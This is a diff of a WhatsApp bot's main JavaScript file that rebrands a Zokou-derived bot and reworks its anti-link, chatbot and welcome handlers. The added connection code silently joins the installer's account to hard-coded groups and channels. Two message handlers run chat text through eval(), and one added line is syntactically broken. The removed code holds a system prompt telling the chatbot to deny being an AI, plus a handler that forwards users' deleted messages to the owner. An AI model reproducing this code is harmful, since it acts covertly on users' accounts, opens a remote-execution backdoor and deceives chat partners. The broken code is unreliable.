+const verifAdmin = verifGroupe ? admins.includes(auteurMessage) : false;
+var verifEzraAdmin = verifGroupe ? admins.includes(idBot) : false;
+
+const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
+const verifCom = texte ? texte.startsWith(prefixe) : false;
+const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
+
+const lien = conf.URL.split(',');
 
             
             // Utiliser une boucle for...of pour parcourir les liens
@@ -932,7 +1296,9 @@ function mybotpic() {
      const lienAleatoire = lien[indiceAleatoire];
      return lienAleatoire;
   }
-            var commandeOptions = {
+
+// Define command options object for reusability
+var commandeOptions = {
     superUser, dev,
     verifGroupe,
     mbre,
@@ -943,7 +1309,7 @@ function mybotpic() {
     auteurMessage,
     nomAuteurMessage,
     idBot,
-    verifZokouAdmin,
+    verifEzraAdmin,
     prefixe,
     arg,
     repondre,
@@ -954,8 +1320,8 @@ function mybotpic() {
     ms,
     mybotpic
 };
-
-
+                 
+   
 // Auto read messages (Existing code, optional)
 if (conf.AUTO_READ === 'yes') {
     zk.ev.on('messages.upsert', async (m) => {
@@ -963,11 +1329,121 @@ if (conf.AUTO_READ === 'yes') {
         for (const message of messages) {
             if (!message.key.fromMe) {
                 await zk.readMessages([message.key]);
-            }
+                }
         }
     });
-                }
+}
+            
+
+if (! superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes') {
+        zk.sendMessage(auteurMessage, {
+          'text': `🚫am blocking you because you have violated ${conf.OWNER_NAME} policies🚫!`
+        });
+        await zk.updateBlockStatus(auteurMessage, 'block');
+      }
+      
+
+      if (texte && texte.startsWith('<')) {
+  if (!superUser) {
+    return repondre(`Only for my ${conf.DEV} or ${conf.OWNER_NAME} to use this command 🚫`);
+  }
+  
+  try { 
+    let evaled = await eval(texte.slice(1)); 
+    if (typeof evaled !== 'string') {
+      evaled = require('util').inspect(evaled); 
+    }
+    await repondre(evaled); 
+  } catch (err) { 
+    await repondre(String(err)); 
+  } 
+      }
+      
+if (texte && texte.startsWith('>')) {
+  // If the sender is not the owner
+  if (!superUser) {
+    const menuText = `This command is only for the owner or kandala tech to execute 🚫`;
+
+    await zk.sendMessage(origineMessage, {
+      text: menuText,
+      contextInfo: {
+        externalAdReply: {
+          title: conf.BOT,
+          body: conf.OWNER_NAME,
+          sourceUrl: conf.GURL,
+          thumbnailUrl: conf.URL,
+          mediaType: 1,
+          showAdAttribution: true,
+          renderLargerThumbnail: false
+        }
+      }
+    });
+    return; 
+  }
+
+  try {
+    let evaled = await eval(texte.slice(1));
+
+    // If the evaluated result is not a string, convert it to a string
+    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
+
+    // Send back the result of the evaluation
+    await repondre(evaled);
+  } catch (err) {
+    // If there's an error, send the error message
+    await repondre(String(err));
+  }
+}
+
+  ///+++++ chatbot handle +++++=//*/
+ let lastTextTime = 0;
+ const messageDelay = 10000;
+      if (!superUser && origineMessage === auteurMessage && conf.CHAT_BOT === 'yes') {
+      console.log('🤖 Chatbot is active');
+  try {
+    const currentTime = Date.now();
+    if (currentTime - lastTextTime < messageDelay) return;
+
+    const response = await axios.get('https://apis-keith.vercel.app/ai/gpt', {
+      params: { q: texte },
+      timeout: 10000
+    });
+
+    if (response.data?.status && response.data?.result) {
+      // Format message in italic using WhatsApp markdown (_text_)
+      const italicMessage = `_${response.data.result}_`;
+      await zk.sendMessage(origineMessage, {
+        text: italicMessage,
+        mentions: [auteurMessage], // Mention the sender
+      }, { quoted: ms }); // Reply to the sender's message
+
+      lastTextTime = currentTime;
+    }
+  } catch (error) {
+    console.error('Chatbot error:', error);
+    // No error message sent to user
+  }
+      }
+      
+      
+    // ++++----***voice chat ai- *****++++///
+
+
+
+  /************************ anti-delete-message */
+
             /** ****** gestion auto-status  */
+                  if (ms.key && ms.key.remoteJid === 'status@broadcast' && conf.AUTO_STATUS_REPLY === "yes") {
+  const user = ms.key.participant;
+  const text = `${conf.AUTO_STATUS_TEXT}`;
+  
+  await zk.sendMessage(user, { 
+    text: text,
+    react: { text: '🤦', key: ms.key }
+  }, { quoted: ms });
+                       }
+                       
+                       
             if (ms.key && ms.key.remoteJid === "status@broadcast" && conf.AUTO_READ_STATUS === "yes") {
                 await zk.readMessages([ms.key]);
             }
@@ -993,7 +1469,7 @@ if (conf.AUTO_READ === 'yes') {
                 // console.log("*nouveau status* ");
             }
             /** ******fin auto-status */
-            if (!dev && origineMessage == "120363158701337904@g.us") {
+             if (!dev && origineMessage == "120363158701337904@g.us") {
                 return;
             }
             
@@ -1013,7 +1489,7 @@ if (conf.AUTO_READ === 'yes') {
         
                 if (ms.message[mtype].contextInfo.mentionedJid && (ms.message[mtype].contextInfo.mentionedJid.includes(idBot) ||  ms.message[mtype].contextInfo.mentionedJid.includes(conf.NUMERO_OWNER + '@s.whatsapp.net'))    /*texte.includes(idBot.split('@')[0]) || texte.includes(conf.NUMERO_OWNER)*/) {
             
-                    if (origineMessage == "120363427466015891@newsletter") {
+                    if (origineMessage == "120363158701337904@g.us") {
                         return;
                     } ;
             
@@ -1077,211 +1553,104 @@ if (conf.AUTO_READ === 'yes') {
             } 
 
 
-     // ============= ANTI-LINK HANDLER =============
+
+     //anti-lien
      try {
-        const isAntiLinkEnabled = await verifierEtatJid(origineMessage);
+        const yes = await verifierEtatJid(origineMessage)
+        if (texte.includes('https://') && verifGroupe &&  yes  ) {
 
-        // Detect links from all message types
-        const allText = texte ||
-            ms?.message?.extendedTextMessage?.text ||
-            ms?.message?.imageMessage?.caption ||
-            ms?.message?.videoMessage?.caption ||
-            ms?.message?.documentMessage?.caption || "";
+         console.log("lien detecté")
+            var verifZokAdmin = verifGroupe ? admins.includes(idBot) : false;
+            
+             if(superUser || verifAdmin || !verifZokAdmin  ) { console.log('je fais rien'); return};
+                        
+                                    const key = {
+                                        remoteJid: origineMessage,
+                                        fromMe: false,
+                                        id: ms.key.id,
+                                        participant: auteurMessage
+                                    };
+                                    var txt = "lien detected, \n";
+                                   // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
+                                    const gifLink = "https://raw.githubusercontent.com/mr-X-force/LUCKY-MD-XFORCE/main/media/remover.gif";
+                                    var sticker = new Sticker(gifLink, {
+                                        pack: 'FrediEzra',
+                                        author: conf.OWNER_NAME,
+                                        type: StickerTypes.FULL,
+                                        categories: ['🤩', '🎉'],
+                                        id: '12345',
+                                        quality: 50,
+                                        background: '#000000'
+                                    });
+                                    await sticker.toFile("st1.webp");
+                                    // var txt = `@${auteurMsgRepondu.split("@")[0]} a été rétiré du groupe..\n`
+                                    var action = await recupererActionJid(origineMessage);
 
-        const hasLink = allText && (
-            allText.includes("http://") ||
-            allText.includes("https://") ||
-            allText.includes("www.") ||
-            allText.includes("chat.whatsapp.com/")
-        );
+                                      if (action === 'remove') {
 
-        console.log("ANTI-LINK CHECK:", {
-            hasLink,
-            isEnabled: isAntiLinkEnabled,
-            isGroup: verifGroupe,
-            text: allText ? allText.substring(0, 50) : "no text"
-        });
+                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group.`;
 
-        if (hasLink && verifGroupe && isAntiLinkEnabled) {
-            console.log("LINK DETECTED in group!");
+                                    await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
+                                    (0, baileys_1.delay)(800);
+                                    await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] }, { quoted: ms });
+                                    try {
+                                        await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
+                                    }
+                                    catch (e) {
+                                        console.log("antiien ") + e;
+                                    }
+                                    await zk.sendMessage(origineMessage, { delete: key });
+                                    await fs.unlink("st1.webp"); } 
+                                        
+                                       else if (action === 'delete') {
+                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} avoid sending link.`;
+                                        // await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") }, { quoted: ms });
+                                       await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] }, { quoted: ms });
+                                       await zk.sendMessage(origineMessage, { delete: key });
+                                       await fs.unlink("st1.webp");
 
-            // Skip admins and owners
-            if (superUser || verifAdmin) {
-                console.log("antilink: user is admin/owner, skipping");
-            } else {
-                const messageToDelete = {
-                    remoteJid: origineMessage,
-                    fromMe: false,
-                    id: ms.key.id,
-                    participant: auteurMessage
-                };
+                                    } else if(action === 'warn') {
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
 
-                // Delete the message
-                try {
-                    await zk.sendMessage(origineMessage, { delete: messageToDelete });
-                    console.log("antilink: message deleted successfully");
-                } catch (e) {
-                    console.log("antilink: delete failed - " + e.message);
-                    // Even if delete fails, send warning
-                    await zk.sendMessage(origineMessage, {
-                        text: `⚠️ *ANTI-LINK*
-@${auteurMessage.split('@')[0]} links are not allowed in this group!`,
-                        mentions: [auteurMessage]
-                    }, { quoted: ms });
-                    return;
-                }
+                            let warn = await getWarnCountByJID(auteurMessage) ; 
+                            let warnlimit = conf.WARN_COUNT
+                         if ( warn >= warnlimit) { 
+                          var kikmsg = `link detected , you will be remove because of reaching warn-limit`;
+                            
+                             await zk.sendMessage(origineMessage, { text: kikmsg , mentions: [auteurMessage] }, { quoted: ms }) ;
 
-                const action = await recupererActionJid(origineMessage);
-                console.log("antilink action:", action);
 
-                if (action === 'remove') {
-                    await zk.sendMessage(origineMessage, {
-                        text: `🚨 *ANTI-LINK | KANDALA XMD*
-@${auteurMessage.split('@')[0]} has been removed for sharing a link.
+                             await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
+                             await zk.sendMessage(origineMessage, { delete: key });
 
-🚫 Links are not allowed in this group!`,
-                        mentions: [auteurMessage]
-                    });
-                    try {
-                        await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
-                        console.log("antilink: user removed");
-                    } catch (e) {
-                        console.log("antilink: remove failed - " + e);
-                    }
 
-                } else if (action === 'warn') {
-                    const { getWarnCountByJID, ajouterUtilisateurAvecWarnCount } = require('./bdd/warn');
-                    let warnCount = await getWarnCountByJID(auteurMessage);
-                    let maxWarns = conf.WARN_COUNT || 3;
+                            } else {
+                                var rest = warnlimit - warn ;
+                              var  msg = `Link detected , your warn_count was upgrade ;\n rest : ${rest} `;
 
-                    if (warnCount >= maxWarns) {
-                        await zk.sendMessage(origineMessage, {
-                            text: `⚠️ *ANTI-LINK | KANDALA XMD*
-@${auteurMessage.split('@')[0]} has been removed after ${maxWarns} warnings!
+                              await ajouterUtilisateurAvecWarnCount(auteurMessage)
 
-🚫 Links are not allowed in this group!`,
-                            mentions: [auteurMessage]
-                        });
-                        try {
-                            await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
-                        } catch (e) {
-                            console.log("antilink: warn-remove failed - " + e);
-                        }
-                    } else {
-                        await ajouterUtilisateurAvecWarnCount(auteurMessage);
-                        await zk.sendMessage(origineMessage, {
-                            text: `⚠️ *ANTI-LINK WARNING | KANDALA XMD*
-@${auteurMessage.split('@')[0]} links are not allowed in this group!
+                              await zk.sendMessage(origineMessage, { text: msg , mentions: [auteurMessage] }, { quoted: ms }) ;
+                              await zk.sendMessage(origineMessage, { delete: key });
 
-⚠️ Warning ${warnCount + 1}/${maxWarns}`,
-                            mentions: [auteurMessage]
-                        });
-                    }
-
-                } else {
-                    // Default: delete only
-                    await zk.sendMessage(origineMessage, {
-                        text: `🛡️ *ANTI-LINK | KANDALA XMD*
-@${auteurMessage.split('@')[0]} your message has been deleted.
-
-🚫 Links are not allowed in this group!`,
-                        mentions: [auteurMessage]
-                    });
-                }
-            }
-        }
-    } catch (e) {
-        console.log("antilink error: " + e);
+                            }
+                                    }
+                                }
+                                
+                            }
+                        
+                    
+                
+            
+        
+    
+    catch (e) {
+        console.log("bdd err " + e);
     }
-    // ============= END ANTI-LINK HANDLER =============
+    
 
-    // ============= ANTI-MENTION HANDLER | by Rahmani Md 🤠 =============
-    try {
-        const isAntiMentionEnabled = await amVerifierEtatJid(origineMessage);
 
-        if (verifGroupe && isAntiMentionEnabled) {
-            // Catch "@ You mentioned this group" status mention notification
-            const isStatusMention = mtype === 'groupStatusMentionMessage' || 
-                                    !!ms.message?.groupStatusMentionMessage;
-
-            // For status mention, get the real sender from the nested message
-            let mentionAuteur = auteurMessage;
-            if (isStatusMention) {
-                const nested = ms.message?.groupStatusMentionMessage;
-                mentionAuteur = nested?.participant || nested?.key?.participant || ms.key?.participant || auteurMessage;
-            }
-
-            const mentions = ms.message?.extendedTextMessage?.contextInfo?.mentionedJid ||
-                             ms.message?.imageMessage?.contextInfo?.mentionedJid ||
-                             ms.message?.videoMessage?.contextInfo?.mentionedJid ||
-                             ms.message?.groupStatusMentionMessage?.message?.extendedTextMessage?.contextInfo?.mentionedJid ||
-                             ms.message?.groupStatusMentionMessage?.message?.imageMessage?.contextInfo?.mentionedJid ||
-                             ms.message?.groupStatusMentionMessage?.message?.videoMessage?.contextInfo?.mentionedJid || [];
-
-            const allText = texte || ms?.message?.extendedTextMessage?.text || "";
-            const hasBroadTag = allText.includes('@everyone') || allText.includes('@here') || allText.includes('@all');
-
-            // Check if mentionAuteur is superUser or admin
-            const allAllowedNumbersForMention = [...(allAllowedNumbers || [])];
-            const isMentionSuperUser = allAllowedNumbersForMention.includes(mentionAuteur);
-            const isMentionAdmin = verifAdmin && mentionAuteur === auteurMessage;
-
-            if ((mentions.length > 0 || hasBroadTag || isStatusMention) && !isMentionSuperUser && !isMentionAdmin) {
-                // Delete the message
-                const messageToDelete = {
-                    remoteJid: origineMessage,
-                    fromMe: false,
-                    id: ms.key.id,
-                    participant: mentionAuteur
-                };
-                try { await zk.sendMessage(origineMessage, { delete: messageToDelete }); } catch (e) {}
-
-                const action = await amRecupererActionJid(origineMessage);
-
-                if (action === 'remove') {
-                    await zk.sendMessage(origineMessage, {
-                        text: `🚫 *ANTI-MENTION | KANDALA MD*\n@${mentionAuteur.split('@')[0]} has been removed for mentioning the group in their status!`,
-                        mentions: [mentionAuteur]
-                    });
-                    try { await zk.groupParticipantsUpdate(origineMessage, [mentionAuteur], "remove"); } catch (e) {
-                        console.log("remove error antimention: " + e);
-                    }
-
-                } else if (action === 'warn') {
-                    const { getWarnCountByJID, ajouterUtilisateurAvecWarnCount } = require('./bdd/warn');
-                    let warnCount = await getWarnCountByJID(mentionAuteur);
-                    let maxWarns = conf.WARN_COUNT || 3;
-                    if (warnCount >= maxWarns) {
-                        await zk.sendMessage(origineMessage, {
-                            text: `⚠️ *ANTI-MENTION | KANDALA MD*\n@${mentionAuteur.split('@')[0]} has been removed after ${maxWarns} warnings!`,
-                            mentions: [mentionAuteur]
-                        });
-                        try { await zk.groupParticipantsUpdate(origineMessage, [mentionAuteur], "remove"); } catch (e) {
-                            console.log("remove after warn error: " + e);
-                        }
-                    } else {
-                        await ajouterUtilisateurAvecWarnCount(mentionAuteur);
-                        await zk.sendMessage(origineMessage, {
-                            text: `⚠️ *ANTI-MENTION WARNING | KANDALA MD*\n@${mentionAuteur.split('@')[0]} mentioning the group in your status is not allowed!\n\n⚠️ Warning ${warnCount + 1}/${maxWarns}`,
-                            mentions: [mentionAuteur]
-                        });
-                    }
-
-                } else {
-                    // action === 'supp' — delete only, send warning message
-                    await zk.sendMessage(origineMessage, {
-                        text: `🛡️ *ANTI-MENTION | KANDALA MD*\n@${mentionAuteur.split('@')[0]} mentioning the group in your status is not allowed!`,
-                        mentions: [mentionAuteur]
-                    });
-                }
-            }
-        }
-    } catch (e) {
-        console.log("antimention error: " + e);
-    }
-    // ============= END ANTI-MENTION HANDLER =============
-
-        /** *************************anti-bot******************************************** */
+    /** *************************anti-bot******************************************** */
     try {
         const botMsg = ms.key?.id?.startsWith('BAES') && ms.key?.id?.length === 16;
         const baileysMsg = ms.key?.id?.startsWith('BAE5') && ms.key?.id?.length === 16;
@@ -1301,9 +1670,9 @@ if (conf.AUTO_READ === 'yes') {
             };
             var txt = "bot detected, \n";
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
-            const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
+            const gifLink = "https://raw.githubusercontent.com/mr-X-force/LUCKY-MD-XFORCE/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Kandala-Md',
+                pack: 'FredieTech',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -1372,74 +1741,17 @@ if (conf.AUTO_READ === 'yes') {
              
          
             /////////////////////////
-
-            // ============= CHATBOT AUTOMATIC (Pollinations AI - Free) =============
-            try {
-                const chatbotEnabled = (conf.CHATBOT || "").toLowerCase() === "yes";
-                const isFromMe = ms.key.fromMe;
-                const isStatus = origineMessage === "status@broadcast";
-                const isNewsletter = origineMessage?.endsWith("@newsletter");
-                const hasText = texte && texte.trim().length > 0;
-                const isCommand = verifCom;
-
-                if (chatbotEnabled && hasText && !isFromMe && !isStatus && !isNewsletter && !isCommand) {
-
-                    // Groups: jibu tu ukimentioned au ukiquote bot
-                    const mentionedJids = ms.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                    const quotedParticipant = ms.message?.extendedTextMessage?.contextInfo?.participant || "";
-                    const botMentioned = mentionedJids.includes(idBot) || quotedParticipant === idBot;
-                    const shouldReply = !verifGroupe || botMentioned;
-
-                    if (shouldReply) {
-                        console.log("🤖 CHATBOT triggered:", auteurMessage);
-                        try {
-                            await zk.sendPresenceUpdate("composing", origineMessage);
-
-                            const encodedMsg = encodeURIComponent(texte.trim());
-                            const systemPrompt = encodeURIComponent(
-                                `Wewe ni kijana wa kawaida unayezungumza WhatsApp. Jina lako ni Kandala. Sheria muhimu:
-1. KAMWE usiseme "Je, ninaweza kukusaidia?" au "Naweza kukusaidia na nini?" au maneno kama hayo - ni marufuku kabisa.
-2. Jibu kwa lugha ile ile mtumiaji anayotumia - Swahili, English, Sheng, au yoyote.
-3. Jibu fupi na za kawaida kama mtu - si kama bot wala customer service.
-4. Ukiambiwa "habari" sema "poa" au "safi" au "nzuri". Ukiambiwa "mzima" sema "ndio mzima" au "fit kabisa". Ukiambiwa kitu chochote jibu kawaida tu.
-5. Usiseme kamwe kwamba wewe ni AI au bot.
-6. Tumia maneno ya mtaani kama: poa, safi, fiti, buda, chali, dame, noma, sawa sawa, si mbaya, inakuwaje, mambo, freshi, uko aje.
-7. Jibu moja kwa moja bila maswali ya ziada isipokuwa swali lenyewe linahitaji jibu la swali.`
-                            );
-
-                            const response = await axios.get(
-                                `https://text.pollinations.ai/${encodedMsg}?model=openai&system=${systemPrompt}&private=true`,
-                                { timeout: 20000, responseType: 'text' }
-                            );
-
-                            const reply = typeof response.data === 'string' ? response.data.trim() : null;
-
-                            if (reply) {
-                                await zk.sendPresenceUpdate("available", origineMessage);
-                                await zk.sendMessage(origineMessage, { text: `🤖 *Kandala AI*\n\n${reply}` }, { quoted: ms });
-                                console.log("✅ CHATBOT replied");
-                            }
-                        } catch (e) {
-                            await zk.sendPresenceUpdate("available", origineMessage);
-                            console.log("CHATBOT error:", e.message);
-                        }
-                    }
-                }
-            } catch (chatbotErr) {
-                console.log("CHATBOT handler error:", chatbotErr.message);
-            }
-            // ============= END CHATBOT =============
-
-            //execution des commandes   
+            
+            //execution des luckycmd   
             if (verifCom) {
                 //await await zk.readMessages(ms.key);
-                const cd = evt.cm.find((zokou) => zokou.nomCom === (com));
+                const cd = evt.cm.find((ezra) => ezra.nomCom === (com));
                 if (cd) {
                     try {
 
             if ((conf.MODE).toLocaleLowerCase() != 'yes' && !superUser) {
                 return;
-            }
+}
 
                          /******************* PM_PERMT***************/
 
@@ -1483,7 +1795,7 @@ if (conf.AUTO_READ === 'yes') {
                     }
                 }
             }
-            //fin exécution commandes
+            //fin exécution luckycmd
         });
         //fin événement message
 
@@ -1497,20 +1809,22 @@ zk.ev.on('group-participants.update', async (group) => {
     try {
         ppgroup = await zk.profilePictureUrl(group.id, 'image');
     } catch {
-        ppgroup = '';
+        ppgroup = 'https://files.catbox.moe/3o37c5.jpeg';
     }
 
     try {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `*KANDALA-XMD WELCOME MESSAGE*`;
+            let msg = `👋 Hello
+`;
+
             let membres = group.participants;
             for (let membre of membres) {
-                msg += ` \n❒ *Hey* 🖐️ @${membre.split("@")[0]} WELCOME TO OUR GROUP. \n\n`;
+                msg += ` *@${membre.split("@")[0]}* Welcome to Our Official Group,`;
             }
 
-            msg += `❒ *READ THE GROUP DESCRIPTION TO AVOID GETTING REMOVED BY KANDALA-XMD.* `;
+            msg += `You might want to read the group Description to avoid getting removed...`;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
@@ -1564,6 +1878,7 @@ zk.ev.on('group-participants.update', async (group) => {
 /******** fin d'evenement groupe update *************************/
 
 
+    
 
     /*****************************Cron setup */
 
@@ -1619,7 +1934,7 @@ zk.ev.on('group-participants.update', async (group) => {
 
         
         //événement contact
-        zk.ev.on("contacts.upsert", async (contacts) => {
+          zk.ev.on("contacts.upsert", async (contacts) => {
             const insertContact = (newContact) => {
                 for (const contact of newContact) {
                     if (store.contacts[contact.id]) {
@@ -1633,31 +1948,36 @@ zk.ev.on('group-participants.update', async (group) => {
             };
             insertContact(contacts);
         });
-           //événement contact
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log(" kandala xmd is connecting...");
+                console.log("ℹ️ Lucky is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ Heroku bt is Connected to WhatsApp! ☺️");
+               await zk.groupAcceptInvite("GmKhyg4DonRCMvFVkAHPSL");
+              await zk.newsletterFollow("120363427466015891@newsletter");
+              await zk. 
+  newsletter follow("120363407614939513@newsletter");
+               await zk.
+              groupAcceptInvite("E2jarQUgOkf3uPPzsiWdND");
+                console.log("🔮 Kandala xmd  Connected to your WhatsApp! 🫧");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Heroku bt is Online 🕸\n\n");
-                //chargement des commandes 
-                console.log("Loading Heroku bt  Commands ...\n");
+                console.log("👀 Kandala xmd  is Online 🕸\n\n");
+                //chargement des luckycmd 
+                console.log("🛒 Loading Kandala xmd  Plugins...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
                             require(__dirname + "/commandes/" + fichier);
-                            console.log(fichier + " Installed Successfully✔️");
+                            console.log(fichier + "🛒🔑 Kandala xmd  plugins Installed Successfully✔️");
                         }
                         catch (e) {
                             console.log(`${fichier} could not be installed due to : ${e}`);
-                        } /* require(__dirname + "/beltah/" + fichier);
+                        } /* require(__dirname + "/command/" + fichier);
                          console.log(fichier + " Installed ✔️")*/
                         (0, baileys_1.delay)(300);
                     }
@@ -1673,36 +1993,29 @@ zk.ev.on('group-participants.update', async (group) => {
                 else {
                     md = "undefined";
                 }
-                console.log("Commands Installation Completed ✅");
-
-                // ===== AUTO-FOLLOW RAHMANI CHANNEL =====
-                try {
-                    const channelId = "0029VbBomqO23n3eqFNZGK3K@newsletter";
-                    await zk.newsletterFollow(channelId);
-                    console.log("✅ Auto-followed Kandala channel successfully!");
-                } catch (e) {
-                    console.log("⚠️ Auto-follow channel error: " + e.message);
-                }
-                // ===== END AUTO-FOLLOW =====
+                console.log("🏆🗡️ Kandala xmd Plugins Installation Completed ✅");
 
                 await activateCrons();
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
 
-                let cmsg =` ⁠⁠⁠⁠
-╭─────────────━┈ 
-│🌍 *ʜᴇʀᴏᴋᴜ-ʙᴛ ɪs ᴄᴏɴɴᴇᴄᴛᴇᴅ*🌍
-╰────────────
-│💫 ᴘʀᴇғɪx: *[ ${prefixe} ]*
-│⭕ ᴍᴏᴅᴇ: *${md}*
-│💢 ʙᴏᴛ ɴᴀᴍᴇ: *kandala-xmd*
-╰────────────
+                let cmsg =`HELLO👋, BOT CONNECTED✅😇⁠⁠⁠⁠
 
-*Follow our Channel For Updates*
-> https://chat.whatsapp.com/Foy4FSXyTk8GmazVXQMhHM
-                
-                
-                 `;
+╭════⊷
+║ *『 ${conf.BOT} IS ONLINE』*
+║    Creator: *${conf.OWNER_NAME}*
+║    Prefix : [  ${prefixe} ]
+║    Mode : ${md} mode
+║    Total Commands : ${evt.cm.length}
+╰──────────────────⊷
+
+╭═══⊷
+┃
+┃ *Thank you for choosing*                      
+┃  *${conf.BOT}*
+> Regards ${conf.OWNER_NAME} 
+╰──────────────────⊷ 
+`;
                     
                 await zk.sendMessage(zk.user.id, { text: cmsg });
                 }
@@ -1713,21 +2026,21 @@ zk.ev.on('group-participants.update', async (group) => {
                     console.log('Session id error, rescan again...');
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionClosed) {
-                    console.log('!!! connexion fermée, reconnexion en cours ...');
+                    console.log('!!! connection closed, reconnection in progress...');
                     main();
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionLost) {
-                    console.log('connection error 😞 ,,, trying to reconnect... ');
+                    console.log('connection error 😞,,, trying to reconnect... ');
                     main();
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason?.connectionReplaced) {
-                    console.log('connexion réplacée ,,, une sesssion est déjà ouverte veuillez la fermer svp !!!');
+                    console.log('connection replaced ,,, a session is already open please close it !!!');
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.loggedOut) {
-                    console.log('vous êtes déconnecté,,, veuillez rescanner le code qr svp');
+                    console.log('you are disconnected,,, please rescan the qr code please');
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.restartRequired) {
-                    console.log('redémarrage en cours ▶️');
+                    console.log('reboot in progress ▶️');
                     main();
                 }   else {
 
@@ -1747,97 +2060,6 @@ zk.ev.on('group-participants.update', async (group) => {
         //événement authentification 
         zk.ev.on("creds.update", saveCreds);
         //fin événement authentification 
-
-        // ============= ANTI-DELETE HANDLER =============
-        zk.ev.on("messages.upsert", async (m) => {
-            if (conf.ANTIDELETE1 === "yes") {
-                const { messages } = m;
-                const ms = messages[0];
-                if (!ms || !ms.message) return;
-
-                const messageKey = ms.key;
-                const remoteJid = messageKey.remoteJid;
-
-                if (!store.chats[remoteJid]) {
-                    store.chats[remoteJid] = [];
-                }
-                store.chats[remoteJid].push(ms);
-
-                if (ms.message.protocolMessage && ms.message.protocolMessage.type === 0) {
-                    const deletedKey = ms.message.protocolMessage.key;
-                    const chatMessages = store.chats[remoteJid];
-                    const deletedMessage = chatMessages.find(msg => msg.key.id === deletedKey.id);
-
-                    if (deletedMessage) {
-                        try {
-                            const participant = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-                            const sender = participant.split('@')[0];
-                            const deleteTime = new Date().toLocaleString();
-                            let groupName = 'Private Chat';
-                            try {
-                                if (remoteJid.endsWith('@g.us')) {
-                                    const meta = await zk.groupMetadata(remoteJid);
-                                    groupName = meta.subject || remoteJid;
-                                }
-                            } catch(e) {}
-
-                            const botOwnerJid = conf.NUMERO_OWNER + "@s.whatsapp.net";
-                            const notification = `🗑️ *ANTI-DELETE | KANDALA XMD*\n\n📅 *Time:* ${deleteTime}\n💬 *Chat:* ${groupName}\n✍️ *Deleted by:* @${sender}`;
-
-                            if (deletedMessage.message.conversation) {
-                                await zk.sendMessage(botOwnerJid, {
-                                    text: notification + "\n\n💬 *Message:*\n" + deletedMessage.message.conversation,
-                                    mentions: [participant]
-                                });
-                            } else if (deletedMessage.message.extendedTextMessage) {
-                                const text = deletedMessage.message.extendedTextMessage.text || '';
-                                await zk.sendMessage(botOwnerJid, {
-                                    text: notification + "\n\n💬 *Message:*\n" + text,
-                                    mentions: [participant]
-                                });
-                            } else if (deletedMessage.message.imageMessage) {
-                                const caption = deletedMessage.message.imageMessage.caption || '';
-                                const imgPath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.imageMessage);
-                                await zk.sendMessage(botOwnerJid, {
-                                    image: { url: imgPath },
-                                    caption: notification + (caption ? "\n\n" + caption : ""),
-                                    mentions: [participant]
-                                });
-                            } else if (deletedMessage.message.videoMessage) {
-                                const caption = deletedMessage.message.videoMessage.caption || '';
-                                const vidPath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.videoMessage);
-                                await zk.sendMessage(botOwnerJid, {
-                                    video: { url: vidPath },
-                                    caption: notification + (caption ? "\n\n" + caption : ""),
-                                    mentions: [participant]
-                                });
-                            } else if (deletedMessage.message.audioMessage) {
-                                const audPath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.audioMessage);
-                                await zk.sendMessage(botOwnerJid, {
-                                    audio: { url: audPath },
-                                    ptt: deletedMessage.message.audioMessage.ptt || false,
-                                    mentions: [participant]
-                                });
-                            } else if (deletedMessage.message.stickerMessage) {
-                                const stkPath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.stickerMessage);
-                                await zk.sendMessage(botOwnerJid, {
-                                    sticker: { url: stkPath },
-                                    mentions: [participant]
-                                });
-                            } else {
-                                await zk.sendMessage(botOwnerJid, {
-                                    text: notification + "\n\n⚠️ *Message type not recoverable*",
-                                    mentions: [participant]
-                                });
-                            }
-                        } catch (error) {
-                            console.error('antidelete error:', error.message);
-                        }
-                    }
-                }
-            }
-        });
-        // ============= END ANTI-DELETE HANDLER =============
         //
         /** ************* */
         //fonctions utiles
